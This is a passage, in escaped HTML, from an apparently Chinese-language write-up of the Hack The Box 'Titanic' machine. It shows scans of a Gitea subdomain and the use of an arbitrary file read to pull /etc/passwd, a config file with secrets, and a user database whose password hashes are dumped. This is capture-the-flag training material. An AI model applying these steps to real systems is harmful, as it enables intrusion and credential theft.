class=\"hljs-number\"\u003e115\u003c/span\u003e::/nonexistent:/usr/sbin/nologin\ntss:x:\u003cspan class=\"hljs-number\"\u003e110\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e116\u003c/span\u003e:TPM software stack,,,:/var/lib/tpm:/\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e/false\nlandscape:x:\u003cspan class=\"hljs-number\"\u003e111\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e117\u003c/span\u003e::/var/lib/landscape:/usr/sbin/nologin\nfwupd-refresh:x:\u003cspan class=\"hljs-number\"\u003e112\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e118\u003c/span\u003e:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin\nusbmux:x:\u003cspan class=\"hljs-number\"\u003e113\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e46\u003c/span\u003e:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin\ndeveloper:x:\u003cspan class=\"hljs-number\"\u003e1000\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e1000\u003c/span\u003e:developer:/home/developer:/\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e/bash\nlxd:x:\u003cspan class=\"hljs-number\"\u003e999\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e100\u003c/span\u003e::/var/snap/lxd/common/lxd:/\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e/false\ndnsmasq:x:\u003cspan class=\"hljs-number\"\u003e114\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e65534\u003c/span\u003e:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin\n_laurel:x:\u003cspan class=\"hljs-number\"\u003e998\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e998\u003c/span\u003e::/var/log/laurel:/\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e/false\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e根据用户信息，找到除了\u003ccode\u003eroot\u003c/code\u003e账户以外存在有\u003ccode\u003eshell\u003c/code\u003e的用户，尝试读取\u003ccode\u003eUserFlag\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason7-Titanic/image5.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e成功读到\u003ccode\u003euserFlag\u003c/code\u003e \u003ccode\u003e14def493d782d069858e8dd5279ca746\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e尝试读取\u003ccode\u003essh\u003c/code\u003e私钥文件，\u003ccode\u003eNotFound\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason7-Titanic/image6.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003ch2\u003egitea\u003c/h2\u003e\n\u003cp\u003e给\u003ccode\u003edev\u003c/code\u003e子域名做一下信息收集\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003enikto\u003c/code\u003e扫描漏洞，\u003ccode\u003edev\u003c/code\u003e大概是在\u003ccode\u003eDocker\u003c/code\u003e 搭建\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e⚡ root@kali  ~  nikto -url http://dev.titanic.htb/                     \n- Nikto v2\u003cspan class=\"hljs-number\"\u003e.5\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.0\u003c/span\u003e\n---------------------------------------------------------------------------\n+ Target IP:          \u003cspan class=\"hljs-number\"\u003e10.10\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.11\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.55\u003c/span\u003e\n+ Target Hostname:    dev.titanic.htb\n+ Target Port:        \u003cspan class=\"hljs-number\"\u003e80\u003c/span\u003e\n+ Start Time:         \u003cspan class=\"hljs-number\"\u003e2025\u003c/span\u003e-02-\u003cspan class=\"hljs-number\"\u003e20\u003c/span\u003e 08:\u003cspan class=\"hljs-number\"\u003e46\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e35\u003c/span\u003e (GMT-\u003cspan class=\"hljs-number\"\u003e5\u003c/span\u003e)\n---------------------------------------------------------------------------\n+ Server: Apache/\u003cspan class=\"hljs-number\"\u003e2.4\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.52\u003c/span\u003e (Ubuntu)\n+ /: The X-Content-\u003cspan class=\"hljs-type\"\u003eType\u003c/span\u003e-Options header \u003cspan class=\"hljs-keyword\"\u003eis\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003enot\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003eset\u003c/span\u003e. This could allow the user agent to render the content of the site \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e a different fashion to the MIME \u003cspan class=\"hljs-built_in\"\u003etype\u003c/span\u003e. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-\u003cspan class=\"hljs-built_in\"\u003etype\u003c/span\u003e-header/\n+ No CGI Directories found (use \u003cspan class=\"hljs-string\"\u003e'-C all'\u003c/span\u003e to force check \u003cspan class=\"hljs-built_in\"\u003eall\u003c/span\u003e possible dirs)\n+ Apache/\u003cspan class=\"hljs-number\"\u003e2.4\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.52\u003c/span\u003e appears to be outdated (current \u003cspan class=\"hljs-keyword\"\u003eis\u003c/span\u003e at least Apache/\u003cspan class=\"hljs-number\"\u003e2.4\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.54\u003c/span\u003e). Apache \u003cspan class=\"hljs-number\"\u003e2.2\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.34\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003eis\u003c/span\u003e the EOL \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e the \u003cspan class=\"hljs-number\"\u003e2.\u003c/span\u003ex branch.\n+ OPTIONS: Allowed HTTP Methods: ARRAY(\u003cspan class=\"hljs-number\"\u003e0x555859cc9d60\u003c/span\u003e) .\nb^[[\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e;5D^[[\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e;5D+ /v2/_catalog: Uncommon header \u003cspan class=\"hljs-string\"\u003e'docker-distribution-api-version'\u003c/span\u003e found, \u003cspan class=\"hljs-keyword\"\u003ewith\u003c/span\u003e contents: registry/\u003cspan class=\"hljs-number\"\u003e2.0\u003c/span\u003e.\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e目录扫描\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e⚡ root@kali  ~/Desktop/\u003cspan class=\"hljs-type\"\u003eDict\u003c/span\u003e/SecLists-\u003cspan class=\"hljs-number\"\u003e2024.3\u003c/span\u003e/Discovery/DNS  dirsearch -u http://dev.titanic.htb -x \u003cspan class=\"hljs-number\"\u003e403\u003c/span\u003e,\u003cspan class=\"hljs-number\"\u003e404\u003c/span\u003e -e php,\u003cspan class=\"hljs-built_in\"\u003ezip\u003c/span\u003e,txt                                                                                     \n/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:\u003cspan class=\"hljs-number\"\u003e23\u003c/span\u003e: DeprecationWarning: pkg_resources \u003cspan class=\"hljs-keyword\"\u003eis\u003c/span\u003e deprecated \u003cspan class=\"hljs-keyword\"\u003eas\u003c/span\u003e an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html\n  \u003cspan class=\"hljs-keyword\"\u003efrom\u003c/span\u003e pkg_resources \u003cspan class=\"hljs-keyword\"\u003eimport\u003c/span\u003e DistributionNotFound, VersionConflict\n\n  _|. _ _  _  _  _ _|_    v0\u003cspan class=\"hljs-number\"\u003e.4\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.3\u003c/span\u003e\n (_||| _) (/_(_|| (_| )\n\nExtensions: php, \u003cspan class=\"hljs-built_in\"\u003ezip\u003c/span\u003e, txt | HTTP method: GET | Threads: \u003cspan class=\"hljs-number\"\u003e25\u003c/span\u003e | Wordlist size: \u003cspan class=\"hljs-number\"\u003e10439\u003c/span\u003e\n\nOutput File: /root/Desktop/\u003cspan class=\"hljs-type\"\u003eDict\u003c/span\u003e/SecLists-\u003cspan class=\"hljs-number\"\u003e2024.3\u003c/span\u003e/Discovery/DNS/reports/http_dev.titanic.htb/_25-02-\u003cspan class=\"hljs-number\"\u003e20_08\u003c/span\u003e-\u003cspan class=\"hljs-number\"\u003e48\u003c/span\u003e-\u003cspan class=\"hljs-number\"\u003e45.\u003c/span\u003etxt\n\nTarget: http://dev.titanic.htb/\n\n[08:\u003cspan class=\"hljs-number\"\u003e48\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e45\u003c/span\u003e] Starting: \n[08:\u003cspan class=\"hljs-number\"\u003e49\u003c/span\u003e:02] \u003cspan class=\"hljs-number\"\u003e200\u003c/span\u003e -    1KB - /.well-known/openid-configuration\n[08:\u003cspan class=\"hljs-number\"\u003e49\u003c/span\u003e:02] \u003cspan class=\"hljs-number\"\u003e200\u003c/span\u003e -  206B  - /.well-known/security.txt\n[08:\u003cspan class=\"hljs-number\"\u003e49\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e10\u003c/span\u003e] \u003cspan class=\"hljs-number\"\u003e303\u003c/span\u003e -   38B  - /admin  -\u003e  /user/login\n[08:\u003cspan class=\"hljs-number\"\u003e49\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e11\u003c/span\u003e] \u003cspan class=\"hljs-number\"\u003e303\u003c/span\u003e -   38B  - /admin/  -\u003e  /user/login\n[08:\u003cspan class=\"hljs-number\"\u003e49\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e18\u003c/span\u003e] \u003cspan class=\"hljs-number\"\u003e200\u003c/span\u003e -   20KB - /administrator/\n[08:\u003cspan class=\"hljs-number\"\u003e49\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e18\u003c/span\u003e] \u003cspan class=\"hljs-number\"\u003e200\u003c/span\u003e -   20KB - /administrator\n[08:\u003cspan class=\"hljs-number\"\u003e49\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e21\u003c/span\u003e] \u003cspan class=\"hljs-number\"\u003e200\u003c/span\u003e -  433B  - /api/swagger\n[08:\u003cspan class=\"hljs-number\"\u003e49\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e35\u003c/span\u003e] \u003cspan class=\"hljs-number\"\u003e200\u003c/span\u003e -   25KB - /developer\n[08:\u003cspan class=\"hljs-number\"\u003e49\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e39\u003c/span\u003e] \u003cspan class=\"hljs-number\"\u003e303\u003c/span\u003e -   41B  - /explore  -\u003e  /explore/repos\n[08:\u003cspan class=\"hljs-number\"\u003e49\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e39\u003c/span\u003e] \u003cspan class=\"hljs-number\"\u003e200\u003c/span\u003e -   20KB - /explore/repos\n[08:\u003cspan class=\"hljs-number\"\u003e49\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e40\u003c/span\u003e] \u003cspan class=\"hljs-number\"\u003e301\u003c/span\u003e -   58B  - /favicon.ico  -\u003e  /assets/img/favicon.png\n[08:\u003cspan class=\"hljs-number\"\u003e49\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e49\u003c/span\u003e] \u003cspan class=\"hljs-number\"\u003e303\u003c/span\u003e -   38B  - /issues  -\u003e  /user/login\n[08:\u003cspan class=\"hljs-number\"\u003e50\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e17\u003c/span\u003e] \u003cspan class=\"hljs-number\"\u003e200\u003c/span\u003e -  170B  - /sitemap.xml\n[08:\u003cspan class=\"hljs-number\"\u003e50\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e25\u003c/span\u003e] \u003cspan class=\"hljs-number\"\u003e200\u003c/span\u003e -   11KB - /user/login/\n[08:\u003cspan class=\"hljs-number\"\u003e50\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e26\u003c/span\u003e] \u003cspan class=\"hljs-number\"\u003e401\u003c/span\u003e -   50B  - /v2\n[08:\u003cspan class=\"hljs-number\"\u003e50\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e26\u003c/span\u003e] \u003cspan class=\"hljs-number\"\u003e401\u003c/span\u003e -   50B  - /v2/_catalog\n[08:\u003cspan class=\"hljs-number\"\u003e50\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e26\u003c/span\u003e] \u003cspan class=\"hljs-number\"\u003e401\u003c/span\u003e -   50B  - /v2/\n\nTask Completed\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e访问\u003ccode\u003e/.well-known/openid-configuration\u003c/code\u003e 又可以找到一个子域名，再添加上\u003ccode\u003ehosts\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason7-Titanic/image7.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e但是访问报\u003ccode\u003eNo response received from remote server.\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003e/.well-known/security.txt\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e\u003cspan class=\"hljs-comment\"\u003e# This site is running a Gitea instance.\u003c/span\u003e\n\u003cspan class=\"hljs-comment\"\u003e# Gitea related security problems could be reported to Gitea community.\u003c/span\u003e\n\u003cspan class=\"hljs-comment\"\u003e# Site related security problems should be reported to this site's admin.\u003c/span\u003e\nContact: https://github.com/go-gitea/gitea/blob/main/SECURITY.md\nPolicy: https://github.com/go-gitea/gitea/blob/main/SECURITY.md\nPreferred-Languages: en\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003ccode\u003e/developer\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason7-Titanic/image8.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003e/developer/docker-config/src/branch/main/mysql/docker-compose.yml\u003c/code\u003e 能找到数据库密码\u003ccode\u003eMySQLP@$$w0rd!\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003eversion: \u003cspan class=\"hljs-string\"\u003e'3.8'\u003c/span\u003e\n\nservices:\n  mysql:\n    image: mysql:\u003cspan class=\"hljs-number\"\u003e8.0\u003c/span\u003e\n    container_name: mysql\n    ports:\n      - \u003cspan class=\"hljs-string\"\u003e\"127.0.0.1:3306:3306\"\u003c/span\u003e\n    environment:\n      MYSQL_ROOT_PASSWORD: \u003cspan class=\"hljs-string\"\u003e'MySQLP@$$w0rd!'\u003c/span\u003e\n      MYSQL_DATABASE: tickets \n      MYSQL_USER: sql_svc\n      MYSQL_PASSWORD: sql_password\n    restart: always\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003ccode\u003e/developer/docker-config/src/branch/main/gitea/docker-compose.yml\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003e/home/developer/gitea/data:/data\u003c/code\u003e, 将容器内的数据挂在到物理机的\u003ccode\u003e/home/developer/gitea/data\u003c/code\u003e目录下\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003eversion: \u003cspan class=\"hljs-string\"\u003e'3'\u003c/span\u003e\n\nservices:\n  gitea:\n    image: gitea/gitea\n    container_name: gitea\n    ports:\n      - \u003cspan class=\"hljs-string\"\u003e\"127.0.0.1:3000:3000\"\u003c/span\u003e\n      - \u003cspan class=\"hljs-string\"\u003e\"127.0.0.1:2222:22\"\u003c/span\u003e  \u003cspan class=\"hljs-comment\"\u003e# Optional for SSH access\u003c/span\u003e\n    volumes:\n      - /home/developer/gitea/data:/data \u003cspan class=\"hljs-comment\"\u003e# Replace with your path\u003c/span\u003e\n    environment:\n      - USER_UID=\u003cspan class=\"hljs-number\"\u003e1000\u003c/span\u003e\n      - USER_GID=\u003cspan class=\"hljs-number\"\u003e1000\u003c/span\u003e\n    restart: always\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e查看\u003ccode\u003egitea\u003c/code\u003e官方文档 \u003ca href=\"https://docs.gitea.com/zh-cn/next/administration/config-cheat-sheet\"\u003ehttps://docs.gitea.com/zh-cn/next/administration/config-cheat-sheet\u003c/a\u003e ，查询到配置文件存放在\u003ccode\u003e/etc/gitea/conf/app.ini\u003c/code\u003e 利用任意文件读取漏洞读取\u003c/p\u003e\n\u003cp\u003e结合 \u003ccode\u003e/home/developer/gitea/data:/data\u003c/code\u003e 构造链接：\u003ccode\u003e/home/developer/gitea/data/gitea/conf/app.ini\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003eAPP_NAME = Gitea: Git \u003cspan class=\"hljs-keyword\"\u003ewith\u003c/span\u003e a cup of tea\nRUN_MODE = prod\nRUN_USER = git\nWORK_PATH = /data/gitea\n\n[repository]\nROOT = /data/git/repositories\n\n[repository.local]\nLOCAL_COPY_PATH = /data/gitea/tmp/local-repo\n\n[repository.upload]\nTEMP_PATH = /data/gitea/uploads\n\n[server]\nAPP_DATA_PATH = /data/gitea\nDOMAIN = gitea.titanic.htb\nSSH_DOMAIN = gitea.titanic.htb\nHTTP_PORT = \u003cspan class=\"hljs-number\"\u003e3000\u003c/span\u003e\nROOT_URL = http://gitea.titanic.htb/\nDISABLE_SSH = false\nSSH_PORT = \u003cspan class=\"hljs-number\"\u003e22\u003c/span\u003e\nSSH_LISTEN_PORT = \u003cspan class=\"hljs-number\"\u003e22\u003c/span\u003e\nLFS_START_SERVER = true\nLFS_JWT_SECRET = OqnUg-uJVK-l7rMN1oaR6oTF348gyr0QtkJt-JpjSO4\nOFFLINE_MODE = true\n\n[database]\nPATH = /data/gitea/gitea.db\nDB_TYPE = sqlite3\nHOST = localhost:\u003cspan class=\"hljs-number\"\u003e3306\u003c/span\u003e\nNAME = gitea\nUSER = root\nPASSWD = \nLOG_SQL = false\nSCHEMA = \nSSL_MODE = disable\n\n[indexer]\nISSUE_INDEXER_PATH = /data/gitea/indexers/issues.bleve\n\n[session]\nPROVIDER_CONFIG = /data/gitea/sessions\nPROVIDER = file\n\n[picture]\nAVATAR_UPLOAD_PATH = /data/gitea/avatars\nREPOSITORY_AVATAR_UPLOAD_PATH = /data/gitea/repo-avatars\n\n[attachment]\nPATH = /data/gitea/attachments\n\n[log]\nMODE = console\nLEVEL = info\nROOT_PATH = /data/gitea/log\n\n[security]\nINSTALL_LOCK = true\nSECRET_KEY = \nREVERSE_PROXY_LIMIT = \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e\nREVERSE_PROXY_TRUSTED_PROXIES = *\nINTERNAL_TOKEN = eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYmYiOjE3MjI1OTUzMzR9.X4rYDGhkWTZKFfnjgES5r2rFRpu_GXTdQ65456XC0X8\nPASSWORD_HASH_ALGO = pbkdf2\n\n[service]\nDISABLE_REGISTRATION = false\nREQUIRE_SIGNIN_VIEW = false\nREGISTER_EMAIL_CONFIRM = false\nENABLE_NOTIFY_MAIL = false\nALLOW_ONLY_EXTERNAL_REGISTRATION = false\nENABLE_CAPTCHA = false\nDEFAULT_KEEP_EMAIL_PRIVATE = false\nDEFAULT_ALLOW_CREATE_ORGANIZATION = true\nDEFAULT_ENABLE_TIMETRACKING = true\nNO_REPLY_ADDRESS = noreply.localhost\n\n[lfs]\nPATH = /data/git/lfs\n\n[mailer]\nENABLED = false\n\n[openid]\nENABLE_OPENID_SIGNIN = true\nENABLE_OPENID_SIGNUP = true\n\n[cron.update_checker]\nENABLED = false\n\n[repository.pull-request]\nDEFAULT_MERGE_STYLE = merge\n\n[repository.signing]\nDEFAULT_TRUST_MODEL = committer\n\n[oauth2]\nJWT_SECRET = FIAOKLQX4SBzvZ9eZnHYLTCiVGoBtkE4y5B7vMjzz3g\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e根据配置文件内容读取\u003ccode\u003egitea.db\u003c/code\u003e 并下载\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason7-Titanic/image9.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e使用\u003ccode\u003esqlite3\u003c/code\u003e打开，并且读取用表数据\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e⚡ root@kali  ~/Desktop/test/titanic  sqlite3 gitea.db \nSQLite version \u003cspan class=\"hljs-number\"\u003e3.46\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.1\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e2024\u003c/span\u003e-08-\u003cspan class=\"hljs-number\"\u003e13\u003c/span\u003e 09:\u003cspan class=\"hljs-number\"\u003e16\u003c/span\u003e:08\nEnter \u003cspan class=\"hljs-string\"\u003e\".help\"\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e usage hints.\nsqlite\u003e \nsqlite\u003e select * \u003cspan class=\"hljs-keyword\"\u003efrom\u003c/span\u003e user;\n\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e|administrator|administrator||root@titanic.htb|\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e|enabled|cba20ccf927d3ad0567b68161732d3fbca098ce886bbc923b4062a3960d459c08d2dfc063b2406ac9207c980c47c5d017136|pbkdf2$\u003cspan class=\"hljs-number\"\u003e50000\u003c/span\u003e$\u003cspan class=\"hljs-number\"\u003e50\u003c/span\u003e|\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e|\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e|\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e||\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e|||70a5bd0c1a5d23caa49030172cdcabdc|2d149e5fbd1b20cf31db3e3c6a28fc9b|en-US||\u003cspan class=\"hljs-number\"\u003e1722595379\u003c/span\u003e|\u003cspan class=\"hljs-number\"\u003e1722597477\u003c/span\u003e|\u003cspan class=\"hljs-number\"\u003e1722597477\u003c/span\u003e|\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e|-\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e|\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e|\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e|\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e|\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e|\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e|\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e|\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e|2e1e70639ac6b0eecbdab4a3d19e0f44|root@titanic.htb|\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e|\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e|\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e|\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e|\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e|\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e|\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e|\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e|\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e||gitea-auto|\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e\n\u003cspan class=\"hljs-number\"\u003e2\u003c/span\u003e|developer|developer||developer@titanic.htb|\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e|enabled|e531d398946137baea70ed6a680a54385ecff131309c0bd8f225f284406b7cbc8efc5dbef30bf1682619263444ea594cfb56|pbkdf2$\u003cspan class=\"hljs-number\"\u003e50000\u003c/span\u003e$\u003cspan class=\"hljs-number\"\u003e50\u003c/span\u003e|\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e|\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e|\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e||\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e|||0ce6f07fc9b557bc070fa7bef76a0d15|8bf3e3452b78544f8bee9400d6936d34|en-US||\u003cspan class=\"hljs-number\"\u003e1722595646\u003c/span\u003e|\u003cspan class=\"hljs-number\"\u003e1740059263\u003c/span\u003e|\u003cspan class=\"hljs-number\"\u003e1740059263\u003c/span\u003e|\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e|-\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e|\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e|\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e|\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e|\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e|\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e|\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e|\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e|e2d95b7e207e432f62f3508be406c11b|developer@titanic.htb|\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e|\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e|\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e|\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e|\u003cspan class=\"hljs-number\"\u003e2\u003c/span\u003e|\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e|\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e|\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e|\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e||gitea-auto|\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e\n\u003cspan class=\"hljs-number\"\u003e3\u003c/span\u003e|sdgeek|sdgeek||sdgeek@hackers-home.com|\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e|enabled|c573bec092520ea80e109d9b6139b9743c5da3a87e10b9c4b09be90cab8597775b4706d1b003e5bd05d8fb9149d66f75eeb3|pbkdf2$\u003cspan class=\"hljs-number\"\u003e50000\u003c/span\u003e$\u003cspan class=\"hljs-number\"\u003e50\u003c/span\u003e|\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e|\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e|\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e||\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e|||2b4667f935725dad4735ce458d7e6763|000e6d5ed0b72df01c823d8a208709f5|en-US||\u003cspan class=\"hljs-number\"\u003e1740054694\u003c/span\u003e|\u003cspan class=\"hljs-number\"\u003e1740054694\u003c/span\u003e|\u003cspan class=\"hljs-number\"\u003e1740054694\u003c/span\u003e|\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e|-\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e|\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e|\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e|\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e|\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e|\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e|\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e|\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e|70a933c63c214a02539f4ad8bfc2480f|sdgeek@hackers-home.com|\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e|\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e|\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e|\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e|\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e|\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e|\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e|\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e|\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e||gitea-auto|\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e\n\u003cspan class=\"hljs-number\"\u003e4\u003c/span\u003e|johndoe|johndoe||john@mail.com|\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e|enabled|1d19a1d61d6c723d5b072998bd8f9148044236e18f1ce28d48152e42fd4349ce2900b16cf223cacec079c3c675e595b69485|pbkdf2$\u003cspan class=\"hljs-number\"\u003e50000\u003c/span\u003e$\u003cspan class=\"hljs-number\"\u003e50\u003c/span\u003e|\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e|\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e|\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e||\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e|||1cca2b09f6015581a78dbc7523a8cb1b|3c0e5ef0a6d4ef9d5b23d01c0b771693|en-US||\u003cspan class=\"hljs-number\"\u003e1740056823\u003c/span\u003e|\u003cspan class=\"hljs-number\"\u003e1740059204\u003c/span\u003e|\u003cspan class=\"hljs-number\"\u003e1740059204\u003c/span\u003e|\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e|-\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e|\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e|\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e|\u003cspan 